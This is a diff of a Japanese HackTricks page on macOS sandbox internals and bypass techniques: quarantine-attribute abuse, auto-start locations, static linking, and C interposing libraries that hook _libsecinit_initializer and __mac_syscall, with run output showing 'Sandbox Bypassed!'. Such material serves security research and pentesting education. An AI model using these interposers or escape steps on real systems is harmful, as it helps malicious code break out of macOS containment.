@@ -4,10 +4,10 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
-* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
@@ -16,26 +16,152 @@
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
-前の画像では、**`com.apple.security.app-sandbox`**という権限を持つアプリケーションが実行されると、**サンドボックスがどのように読み込まれるか**がわかります。
+前の画像では、**`com.apple.security.app-sandbox`**の権限を持つアプリケーションが実行されると、**サンドボックスがどのように読み込まれるか**が観察できます。
 
 コンパイラは`/usr/lib/libSystem.B.dylib`をバイナリにリンクします。
 
-その後、**`libSystem.B`**は他のいくつかの関数を呼び出し、**`xpc_pipe_routine`**がアプリの権限を**`securityd`**に送信します。Securitydはプロセスがサンドボックス内に隔離されるべきかどうかをチェックし、隔離される場合は隔離されます。\
+その後、**`libSystem.B`**は他のいくつかの関数を呼び出し、**`xpc_pipe_routine`**がアプリの権限を**`securityd`**に送信します。Securitydはプロセスがサンドボックス内に隔離される必要があるかどうかをチェックし、必要な場合は隔離されます。\
 最後に、サンドボックスは**`__sandbox_ms`**を呼び出してアクティブ化され、**`__mac_syscall`**が呼び出されます。
 
 ## バイパスの可能性
 
-{% hint style="warning" %}
-サンドボックス化されたプロセスによって作成されたファイルには、サンドボックスからの脱出を防ぐために**隔離属性**が追加されます。
-{% endhint %}
+### 隔離属性のバイパス
 
-### サンドボックスなしでバイナリを実行する
+**サンドボックス化されたプロセスによって作成されたファイル**は、サンドボックスからの脱出を防ぐために**隔離属性**が追加されます。ただし、サンドボックス化されたアプリケーション内で**隔離属性のない`.app`バンドルを作成**できれば、アプリバンドルのバイナリを**`/bin/bash`**に指定し、**plist**にいくつかの環境変数を追加して、launchctlを悪用して**サンドボックスを回避して新しいアプリを起動**することができます。
 
-サンドボックス化されたバイナリからサンドボックス化されていないバイナリを実行すると、**親プロセスのサンドボックス内で実行**されます。
+これは、[**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)で行われたことです。
 
-### lldbを使用してサンドボックスをデバッグ＆バイパスする
+### Open機能の悪用
 
-サンドボックス化されるはずのアプリケーションをコンパイルしましょう：
+[**Wordサンドボックス回避の最後の例**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)では、**`open`**のCLI機能がサンドボックスを回避するために悪用されることがわかります。
+
+### Auto Start Locationsの悪用
+
+サンドボックス化されたプロセスが、**後でサンドボックス化されていないアプリケーションがバイナリを実行する場所に書き込む**ことができれば、バイナリをそこに配置することで**簡単に脱出**することができます。この種の場所の良い例は、`~/Library/LaunchAgents`や`/System/Library/LaunchDaemons`です。
+
+これには**2つのステップ**が必要な場合もあります。より許可のあるサンドボックス（`file-read*`、`file-write*`）を持つプロセスを作成し、実際には**サンドボックスを回避して実行**される場所に書き込むコードを実行することです。
+
+**Auto Start locations**については、次のページを参照してください：
+
+{% content-ref url="../../../../macos-auto-start-locations.md" %}
+[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
+{% endcontent-ref %}
+
+### 他のプロセスの悪用
+
+サンドボックスプロセスから、より制限の少ないサンドボックス（またはサンドボックスがない）で実行されている他のプロセスを**侵害**することができれば、それらのサンドボックスから脱出することができます。
+
+{% content-ref url="../../../macos-proces-abuse/" %}
+[macos-proces-abuse](../../../macos-proces-abuse/)
+{% endcontent-ref %}
+
+### 静的コンパイルと動的リンク
+
+[**この研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)では、サンドボックスをバイパスする2つの方法が発見されました。サンドボックスは、**libSystem**ライブラリがロードされるときにユーザーランドから適用されます。バイナリがそれをロードするのを回避できれば、サンドボックスは適用されません。
+
+* バイナリが**完全に静的にコンパイル**されている場合、そのライブラリをロードする必要はありません。
+* バイナリがライブラリをロードする必要がない場合（リンカもlibSystemに含まれているため）、libSystemをロードする必要はありません。
+
+### シェルコード
+
+ARM64の場合でも、**シェルコードでさえも**`libSystem.dylib`にリンクする必要があります。
+```bash
+ld -o shell shell.o -macosx_version_min 13.0
+ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
+```
+### 権限
+
+注意してください、特定の権限がアプリケーションにある場合、サンドボックスで許可されている**アクション**でも、次のように特定の**権限**がある場合は許可されません。
+```scheme
+(when (entitlement "com.apple.security.network.client")
+(allow network-outbound (remote ip))
+(allow mach-lookup
+(global-name "com.apple.airportd")
+(global-name "com.apple.cfnetwork.AuthBrokerAgent")
+(global-name "com.apple.cfnetwork.cfnetworkagent")
+[...]
+```
+### インターポストバイパス
+
+**インターポスト**の詳細については、以下を参照してください：
+
+{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% endcontent-ref %}
+
+#### サンドボックスを回避するために `_libsecinit_initializer` をインターポストする
+```c
+// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include <stdio.h>
+
+void _libsecinit_initializer(void);
+
+void overriden__libsecinit_initializer(void) {
+printf("_libsecinit_initializer called\n");
+}
+
+__attribute__((used, section("__DATA,__interpose"))) static struct {
+void (*overriden__libsecinit_initializer)(void);
+void (*_libsecinit_initializer)(void);
+}
+_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
+```
+
+```bash
+DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+_libsecinit_initializer called
+Sandbox Bypassed!
+```
+#### サンドボックスを防ぐために `__mac_syscall` をインターポストする
+
+{% code title="interpose.c" %}
+```c
+// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include <stdio.h>
+#include <string.h>
+
+// Forward Declaration
+int __mac_syscall(const char *_policyname, int _call, void *_arg);
+
+// Replacement function
+int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
+printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
+if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
+printf("Bypassing Sandbox initiation.\n");
+return 0; // pretend we did the job without actually calling __mac_syscall
+}
+// Call the original function for other cases
+return __mac_syscall(_policyname, _call, _arg);
+}
+
+// Interpose Definition
+struct interpose_sym {
+const void *replacement;
+const void *original;
+};
+
+// Interpose __mac_syscall with my_mac_syscall
+__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
+{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
+};
+```
+{% endcode %}
+```bash
+DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 0
+Bypassing Sandbox initiation.
+__mac_syscall invoked. Policy: Quarantine, Call: 87
+__mac_syscall invoked. Policy: Sandbox, Call: 4
+Sandbox Bypassed!
+```
+### lldbを使用してSandboxのデバッグとバイパスする
+
+Sandboxされるべきアプリケーションをコンパイルしましょう：
 
 {% tabs %}
 {% tab title="sand.c" %}
@@ -49,9 +175,15 @@ system("cat ~/Desktop/del.txt");
 
 このファイルは、macOSアプリケーションのエンタイトルメント（権限）を定義するために使用されます。エンタイトルメントは、アプリケーションが実行する特定の操作やリソースにアクセスするための許可を与えるものです。このファイルには、アプリケーションが必要とするエンタイトルメントのリストが含まれています。
 
-エンタイトルメントは、アプリケーションがmacOSのセキュリティ保護機能をバイパスするために使用されることがあります。攻撃者は、特定のエンタイトルメントを要求することで、アプリケーションのセキュリティ制約を回避し、特権の昇格を行うことができます。
+エンタイトルメントは、アプリケーションのセキュリティと特権のエスカレーションを制御するために重要です。正しく設定されていない場合、アプリケーションは制限されたリソースにアクセスできないか、予期しない操作を実行する可能性があります。
 
-このファイルを悪意のある目的で使用することは、違法行為であり、厳しく禁止されています。セキュリティの向上と個人のプライバシーの保護のために、正当な目的でのみ使用してください。
+このファイルを使用してエンタイトルメントを設定するには、次の手順に従ってください。
+
+1. 必要なエンタイトルメントを特定します。これは、アプリケーションが実行する操作やアクセスするリソースに基づいています。
+2. entitlements.xmlファイルを開き、必要なエンタイトルメントを追加します。各エンタイトルメントは、<key>と<true/>の間に記述されます。
+3. エンタイトルメントをアプリケーションに適用するために、アプリケーションのビルド設定でこのファイルを指定します。
+
+エンタイトルメントは、アプリケーションのセキュリティを向上させるために重要な役割を果たします。正しく設定されたエンタイトルメントは、アプリケーションの特権のエスカレーションを防ぎ、悪意のある操作から保護します。
 
 {% endtab %}
 ```xml
@@ -102,7 +234,7 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 
 {% hint style="danger" %}
 アプリは、**Sandboxが許可しない**ファイル**`~/Desktop/del.txt`**を**読み取ろうとします**。\
-Sandboxがバイパスされると、それを読み取ることができるように、そこにファイルを作成してください。
+Sandboxがバイパスされると、それを読み取ることができるように、そこにファイルを作成してください：
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
@@ -184,132 +316,8 @@ libsystem_kernel.dylib`:
 サンドボックスがバイパスされました！
 プロセス2517はステータス= 0（0x00000000）で終了しました
 {% hint style="warning" %}
-**Sandboxがバイパスされていても、TCC**はユーザーにデスクトップからのファイル読み取りを許可するかどうか尋ねます。
+**サンドボックスがバイパスされていても、TCC**はユーザーに対して、プロセスがデスクトップからファイルを読み取ることを許可するかどうか尋ねます。
 {% endhint %}
-
-### 他のプロセスの乱用
-
-もしサンドボックス内のプロセスが他の制約の少ないサンドボックス（または制約のないサンドボックス）で実行されている場合、それらのサンドボックスに脱出することができます：
-
-{% content-ref url="../../../macos-proces-abuse/" %}
-[macos-proces-abuse](../../../macos-proces-abuse/)
-{% endcontent-ref %}
-
-### インターポストバイパス
-
-**インターポスト**の詳細については、次を参照してください：
-
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
-{% endcontent-ref %}
-
-#### サンドボックスを防ぐために `_libsecinit_initializer` をインターポストする
-```c
-// gcc -dynamiclib interpose.c -o interpose.dylib
-
-#include <stdio.h>
-
-void _libsecinit_initializer(void);
-
-void overriden__libsecinit_initializer(void) {
-printf("_libsecinit_initializer called\n");
-}
-
-__attribute__((used, section("__DATA,__interpose"))) static struct {
-void (*overriden__libsecinit_initializer)(void);
-void (*_libsecinit_initializer)(void);
-}
-_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
-```
-
-```bash
-DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
-_libsecinit_initializer called
-Sandbox Bypassed!
-```
-#### サンドボックスを防ぐために `__mac_syscall` をインターポストする
-
-{% code title="interpose.c" %}
-```c
-// gcc -dynamiclib interpose.c -o interpose.dylib
-
-#include <stdio.h>
-#include <string.h>
-
-// Forward Declaration
-int __mac_syscall(const char *_policyname, int _call, void *_arg);
-
-// Replacement function
-int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
-printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
-if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
-printf("Bypassing Sandbox initiation.\n");
-return 0; // pretend we did the job without actually calling __mac_syscall
-}
-// Call the original function for other cases
-return __mac_syscall(_policyname, _call, _arg);
-}
-
-// Interpose Definition
-struct interpose_sym {
-const void *replacement;
-const void *original;
-};
-
-// Interpose __mac_syscall with my_mac_syscall
-__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
-{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
-};
-```
-{% endcode %}
-```bash
-DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
-
-__mac_syscall invoked. Policy: Sandbox, Call: 2
-__mac_syscall invoked. Policy: Sandbox, Call: 2
-__mac_syscall invoked. Policy: Sandbox, Call: 0
-Bypassing Sandbox initiation.
-__mac_syscall invoked. Policy: Quarantine, Call: 87
-__mac_syscall invoked. Policy: Sandbox, Call: 4
-Sandbox Bypassed!
-```
-### 静的コンパイルと動的リンク
-
-[**この研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)では、Sandboxを回避するための2つの方法が発見されました。Sandboxは、**libSystem**ライブラリがロードされるときにユーザーランドから適用されます。バイナリがそれをロードするのを回避できれば、Sandboxは適用されません。
-
-* バイナリが**完全に静的にコンパイル**されている場合、そのライブラリをロードする必要がありません。
-* バイナリがライブラリをロードする必要がない場合（リンカもlibSystemに含まれているため）、libSystemをロードする必要はありません。
-
-### シェルコード
-
-ARM64の場合でも、**シェルコードでさえ**`libSystem.dylib`にリンクする必要があります。
-```bash
-ld -o shell shell.o -macosx_version_min 13.0
-ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
-```
-### 権限
-
-注意してください、特定の権限がアプリケーションにある場合、サンドボックスで許可されている**アクション**でも、次のように特定の**権限**がある場合は許可されません。
-```scheme
-(when (entitlement "com.apple.security.network.client")
-(allow network-outbound (remote ip))
-(allow mach-lookup
-(global-name "com.apple.airportd")
-(global-name "com.apple.cfnetwork.AuthBrokerAgent")
-(global-name "com.apple.cfnetwork.cfnetworkagent")
-[...]
-```
-### Auto Startの場所の悪用
-
-もしサンドボックス化されたプロセスが、**後でサンドボックス化されていないアプリケーションがバイナリを実行する場所に書き込む**ことができれば、バイナリをそこに**配置するだけで脱出**することができます。この種の場所の良い例は、`~/Library/LaunchAgents`や`/System/Library/LaunchDaemons`です。
-
-これには**2つのステップ**が必要かもしれません: より**許可のあるサンドボックス**(`file-read*`、`file-write*`)を持つプロセスを作成し、実際には**サンドボックス化されていない場所に書き込む**コードを実行します。
-
-このページをチェックしてください: **Auto Startの場所**についてのページ:
-
-{% content-ref url="../../../../macos-auto-start-locations.md" %}
-[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
-{% endcontent-ref %}
 
 ## 参考文献
 
@@ -321,10 +329,10 @@ ld: dynamic executables or dylibs must link with libSystem.dylib for architectur
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
